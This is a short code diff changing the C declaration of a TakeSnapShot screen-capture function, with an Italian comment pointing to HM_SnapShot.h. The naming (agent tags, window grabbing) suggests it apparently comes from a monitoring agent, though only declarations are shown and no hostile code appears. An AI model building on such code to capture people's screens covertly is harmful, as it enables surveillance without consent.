@@ -58,5 +58,5 @@ typedef struct _url_info_struct {
 
 
 // Dichiarata in HM_SnapShot.h in cui questo file viene incluso
-extern void TakeSnapShot(HWND grabwind, BOOL only_window, DWORD agent_tag, url_info_struct *url_info);
+extern void TakeSnapShot(HWND grabwind, BOOL only_window, DWORD quality);
 extern void TakeMiniSnapShot(DWORD agent_tag, HWND grabwind, int xPos, int yPos, DWORD g_xscdim, DWORD g_yscdim);
